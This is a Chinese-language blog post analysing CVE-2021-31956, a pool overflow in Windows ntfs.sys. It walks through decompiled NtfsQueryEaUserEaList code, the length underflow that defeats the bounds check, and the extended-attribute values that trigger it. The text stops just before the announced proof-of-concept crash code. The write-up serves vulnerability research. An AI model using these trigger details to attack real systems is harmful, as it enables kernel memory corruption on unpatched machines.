<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CVE-2021-31956 ：NTFS 模块的池溢出漏洞 | ret2ver</title><meta name="author" content="Vergissmeinnicht"><meta name="copyright" content="Vergissmeinnicht"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="漏洞分析漏洞存在于 ntfs.sys 驱动中的 NtfsQueryEaUserEaList 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778_QW">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-31956 ：NTFS 模块的池溢出漏洞">
<meta property="og:url" content="https://ret2ver.github.io/2021/12/27/CVE-2021-31956-%EF%BC%9ANTFS-%E6%A8%A1%E5%9D%97%E7%9A%84%E6%B1%A0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="ret2ver">
<meta property="og:description" content="漏洞分析漏洞存在于 ntfs.sys 驱动中的 NtfsQueryEaUserEaList 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778_QW">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2021-12-27T07:11:21.000Z">
<meta property="article:modified_time" content="2022-05-04T14:00:44.463Z">
<meta property="article:author" content="Vergissmeinnicht">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ret2ver.github.io/2021/12/27/CVE-2021-31956-%EF%BC%9ANTFS-%E6%A8%A1%E5%9D%97%E7%9A%84%E6%B1%A0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2021-31956 ：NTFS 模块的池溢出漏洞',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-04 22:00:44'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/04/29/RkrKDQiodbYj2eu.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">32</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ret2ver</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2021-31956 ：NTFS 模块的池溢出漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-12-27T07:11:21.000Z" title="Created 2021-12-27 15:11:21">2021-12-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-05-04T14:00:44.463Z" title="Updated 2022-05-04 22:00:44">2022-05-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Windows/">Windows</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Windows/Kernel/">Kernel</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Windows/Kernel/NTFS/">NTFS</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/Windows/Kernel/NTFS/CVE/">CVE</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2021-31956 ：NTFS 模块的池溢出漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞存在于 <code>ntfs.sys</code> 驱动中的 <code>NtfsQueryEaUserEaList</code> 函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *__fastcall <span class="title">NtfsQueryEaUserEaList</span><span class="params">(_QWORD *a1, __int64 ea_blocks_for_file, __int64 a3, __int64 out_buffer, <span class="type">unsigned</span> <span class="type">int</span> out_buf_length, <span class="type">unsigned</span> <span class="type">int</span> *a6, <span class="type">char</span> a7)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> eaList_iter; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> padding; <span class="comment">// er15</span></span><br><span class="line">  _FILE_GET_EA_INFORMATION *current_ea; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nextEntryOffset; <span class="comment">// er14</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 eaNameLength; <span class="comment">// r13</span></span><br><span class="line">  _FILE_GET_EA_INFORMATION *i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> occupied_length_0; <span class="comment">// ebx</span></span><br><span class="line">  _DWORD *out_buf_pos; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ea_block_size; <span class="comment">// er14</span></span><br><span class="line">  _FILE_FULL_EA_INFORMATION *ea_block; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> next_iter; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ea_block_pos; <span class="comment">// [rsp+24h] [rbp-34h] BYREF</span></span><br><span class="line">  _DWORD *last_out_buf_pos; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_STRING</span> DestinationString; <span class="comment">// [rsp+30h] [rbp-28h] BYREF</span></span><br><span class="line">  STRING SourceString; <span class="comment">// [rsp+40h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> occupied_length; <span class="comment">// [rsp+A0h] [rbp+48h]</span></span><br><span class="line"></span><br><span class="line">	last_out_buf_pos = <span class="number">0</span>i64;</span><br><span class="line">  eaList_iter = <span class="number">0</span>;</span><br><span class="line">  occupied_length = <span class="number">0</span>;</span><br><span class="line">  padding = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">	 &#123;</span><br><span class="line">    current_ea = (_FILE_GET_EA_INFORMATION *)((<span class="type">char</span> *)eaList + eaList_iter);</span><br><span class="line">    *(_QWORD *)&amp;DestinationString.Length = <span class="number">0</span>i64;</span><br><span class="line">    DestinationString.Buffer = <span class="number">0</span>i64;</span><br><span class="line">    *(_QWORD *)&amp;SourceString.Length = <span class="number">0</span>i64;</span><br><span class="line">    SourceString.Buffer = <span class="number">0</span>i64;</span><br><span class="line">    *(_QWORD *)&amp;DestinationString.Length = current_ea-&gt;EaNameLength;</span><br><span class="line">    DestinationString.MaximumLength = DestinationString.Length;</span><br><span class="line">    DestinationString.Buffer = current_ea-&gt;EaName;</span><br><span class="line">    <span class="built_in">RtlUpperString</span>(&amp;DestinationString, &amp;DestinationString);</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)<span class="built_in">NtfsIsEaNameValid</span>(&amp;DestinationString) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    nextEntryOffset = current_ea-&gt;NextEntryOffset;</span><br><span class="line">    eaNameLength = current_ea-&gt;EaNameLength;</span><br><span class="line">    next_iter = current_ea-&gt;NextEntryOffset + eaList_iter;</span><br><span class="line">    <span class="keyword">for</span> ( i = (_FILE_GET_EA_INFORMATION *)eaList; ; i = (_FILE_GET_EA_INFORMATION *)((<span class="type">char</span> *)i + i-&gt;NextEntryOffset) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i == current_ea )</span><br><span class="line">      &#123;</span><br><span class="line">        occupied_length_0 = occupied_length;</span><br><span class="line">        out_buf_pos = (_DWORD *)(out_buffer + padding + occupied_length);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">NtfsLocateEaByName</span>(ea_blocks_for_file, *(_DWORD *)(a3 + <span class="number">4</span>), &amp;DestinationString, &amp;ea_block_pos) )</span><br><span class="line">        &#123;</span><br><span class="line">          ea_block = (_FILE_FULL_EA_INFORMATION *)(ea_blocks_for_file + ea_block_pos);</span><br><span class="line">          ea_block_size = ea_block-&gt;EaValueLength + ea_block-&gt;EaNameLength + <span class="number">9</span>;</span><br><span class="line">          <span class="keyword">if</span> ( ea_block_size &lt;= out_buf_length - padding )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">memmove</span>(out_buf_pos, ea_block, ea_block_size);</span><br><span class="line">            *out_buf_pos = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					...</span><br><span class="line">				LABEL_8:</span><br><span class="line">          occupied_length = ea_block_size + padding + occupied_length_0;</span><br><span class="line">					<span class="keyword">if</span> ( !a7 )&#123;</span><br><span class="line">						<span class="keyword">if</span> ( last_out_buf_pos )</span><br><span class="line">              *last_out_buf_pos = (_DWORD)out_buf_pos - (_DWORD)last_out_buf_pos;</span><br><span class="line">            <span class="keyword">if</span> ( current_ea-&gt;NextEntryOffset )</span><br><span class="line">            &#123;</span><br><span class="line">							last_out_buf_pos = out_buf_pos;</span><br><span class="line">							out_buf_length -= ea_block_size + padding;</span><br><span class="line">							padding = ((ea_block_size + <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFC</span>) - ea_block_size;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					...</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		...</span><br><span class="line">				</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>FILE_FULL_EA_INFORMATION</code> 的结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_FULL_EA_INFORMATION</span> &#123;</span><br><span class="line">  ULONG  NextEntryOffset;</span><br><span class="line">  UCHAR  Flags;</span><br><span class="line">  UCHAR  EaNameLength;</span><br><span class="line">  USHORT EaValueLength;</span><br><span class="line">  CHAR   EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>在 <code>NtfsQueryEaUserEaList</code>  中，<code>ea_block</code> 是由攻击者所控制的，而在 <code>memmove</code> 判断语句中的检查可能会存在 <code>out_buf_length - padding</code> 向下溢出的情况，而 <code>out_buf</code> 又是由上层函数 <code>NtfsCommonQueryEa</code> 所申请的：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">NtfsCommonQueryEa</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">	<span class="keyword">if</span> ( (_DWORD)out_buf_length )</span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(a2 + <span class="number">64</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v34 = v14;</span><br><span class="line">      out_buf = <span class="built_in">ExAllocatePoolWithTag</span>((POOL_TYPE)<span class="number">17</span>, out_buf_length, <span class="string">&#x27;EFtN&#x27;</span>);</span><br><span class="line">      v28 = out_buf;</span><br><span class="line">      v24 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(out_buf, <span class="number">0</span>, out_buf_length);</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ( v33 )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = <span class="built_in">NtfsQueryEaUserEaList</span>(&amp;v33, v30, (__int64)v27, (__int64)out_buf, out_buf_length, v33, v39);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其是根据 <code>out_buf_length</code> 作为大小申请的 <code>paged pool</code> ，当 <code>memmove</code> 的时候其拷贝了 <code>ea_block_size</code> 个字节，就可能导致溢出。</p>
<p>通过寻找 <code>NtfsCommonQueryEa</code> 函数的调用者，我们可以发现 <code>NtQueryEaFile</code> 这个系统调用会触发该函数，而根据 <code>ZwQueryEaFile</code> 的 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-zwqueryeafile">描述</a> ，我们可以发现 <code>out_buf_length</code> 是可以控制的，那么我们便可以随心所欲地更改其大小来达到触发漏洞的目的。</p>
<p>下面我们来研究一下该如何触发。在这里面 <code>EA</code> 指的是 <code>extended attributes</code> ，我们所传入的是是 <code>FILE_FULL_EA_INFORMATION</code> 结构的数据，假设文件的拓展属性中有两个拓展属性，当第一个拓展属性如下时：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ea_block-&gt;EaNameLength = <span class="number">5</span></span><br><span class="line">ea_block-&gt;EaValueLength = <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>我们可以计算出：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ea_block_size </span><br><span class="line">	= ea_block-&gt;EaValueLength + ea_block-&gt;EaNameLength + <span class="number">9</span> </span><br><span class="line">	= <span class="number">5</span> + <span class="number">4</span> + <span class="number">9</span></span><br><span class="line">	= <span class="number">18</span></span><br></pre></td></tr></table></figure>

<p>当然一开始的时候 <code>padding</code> 和 <code>occupied_length</code> 都为 <code>0</code> ，我们假设 <code>out_buf_lenth</code> 为 <code>30</code> ，那么：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="number">0</span></span><br><span class="line">occupied_length = <span class="number">0</span></span><br><span class="line">out_buf_length = <span class="number">30</span></span><br><span class="line">out_buf_pos = *(out_buffer + padding + occupied_length) = *out_buffer </span><br><span class="line"></span><br><span class="line">ea_block_size &lt;= out_buf_length - padding =&gt; <span class="number">18</span> &lt;= <span class="number">30</span> - <span class="number">0</span> =&gt; <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memmove</span>(out_buf_pos, ea_block, ea_block_size)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时会从 <code>ea_block</code> 拷贝 <code>18</code> 个字节到 <code>out_buf</code> ，然后 <code>padding</code> 和 <code>out_buf_length</code> 以及 <code>occupied_length</code> 都会做更新：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">occupied_length </span><br><span class="line">	= ea_block_size + padding + occupied_length</span><br><span class="line">	= <span class="number">18</span> + <span class="number">0</span> + <span class="number">0</span></span><br><span class="line">	= <span class="number">18</span></span><br><span class="line"></span><br><span class="line">out_buf_length </span><br><span class="line">	= out_buf_length - (ea_block_size + padding)</span><br><span class="line">	= <span class="number">30</span> - (<span class="number">18</span> + <span class="number">0</span>)</span><br><span class="line">	= <span class="number">12</span></span><br><span class="line"></span><br><span class="line">padding </span><br><span class="line">	= ((ea_block_size + <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFC</span>) - ea_block_size</span><br><span class="line">	= ((<span class="number">18</span> + <span class="number">3</span>) &amp; <span class="number">0xFFFFFFFC</span>) - <span class="number">18</span></span><br><span class="line">	= <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>padding</code> 之所以这么计算是因为每个 <code>ea</code> 块都应该被填充为 <code>32</code> 比特对齐的。</p>
<p>那么当函数处理第二个拓展属性的时候，假设其如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ea_block-&gt;EaNameLength = <span class="number">5</span></span><br><span class="line">ea_block-&gt;EaValueLength = <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>我们可以计算出：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ea_block_size </span><br><span class="line">	= ea_block-&gt;EaValueLength + ea_block-&gt;EaNameLength + <span class="number">9</span> </span><br><span class="line">	= <span class="number">5</span> + <span class="number">4</span> + <span class="number">9</span></span><br><span class="line">	= <span class="number">18</span></span><br></pre></td></tr></table></figure>

<p>此时的 <code>padding</code> 为 <code>2</code> ，那么：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="number">2</span></span><br><span class="line">out_buf_length = <span class="number">12</span></span><br><span class="line">occupied_length = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">ea_block_size &lt;= out_buf_length - padding =&gt; <span class="number">18</span> &lt;= <span class="number">12</span> - <span class="number">2</span> =&gt; <span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>判断的条件是不满足的，也就不会 <code>memove</code></p>
<p>但是如果我们把 <code>ouf_buf_length</code> 在第一次的时候就设置为 <code>18</code> ，那么它可以通过第一次的检查：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="number">0</span></span><br><span class="line">out_buf_length = <span class="number">18</span></span><br><span class="line">out_buf_pos = *(out_buffer + padding + occupied_length) = *out_buffer </span><br><span class="line"></span><br><span class="line">ea_block_size &lt;= out_buf_length - padding =&gt; <span class="number">18</span> &lt;= <span class="number">18</span> - <span class="number">0</span> =&gt; <span class="literal">true</span></span><br><span class="line"><span class="built_in">memmove</span>(out_buf_pos, ea_block, ea_block_size)</span><br></pre></td></tr></table></figure>

<p>然后在第二次的时候，因为计算向下溢出，所以也可以通过检查：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">padding = <span class="number">2</span></span><br><span class="line">out_buf_length = <span class="number">0</span></span><br><span class="line">out_buf_pos = *(out_buffer + padding + occupied_length) = *(out_buffer + <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">ea_block_size &lt;= out_buf_length - padding =&gt; <span class="number">18</span> &lt;= <span class="number">0</span> - <span class="number">2</span> =&gt; <span class="literal">true</span></span><br><span class="line"><span class="built_in">memmove</span>(out_buf_pos, ea_block, ea_block_size)</span><br></pre></td></tr></table></figure>

<p>此时便会向 <code>*(out_buffer + 20)</code> 的地方再次拷贝 <code>18</code> 个字节的数据，而 <code>out_buffer</code> 只有 <code>18</code> 字节的大小，所以这里就造成了越界数据拷贝。</p>
<p>接下来是编写代码触发漏洞，从微软的 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-zwseteafile">官方文档</a> 中我们可以发现 <code>ZwSetEaFile</code> 可以用来设置文件的拓展属性：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ZwSetEaFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE           FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  PVOID            Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  ULONG            Length</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>那么根据上面所提到的内容，编写对应的 <code>BSOD</code> 的 <code>poc</code> 如下：</p>
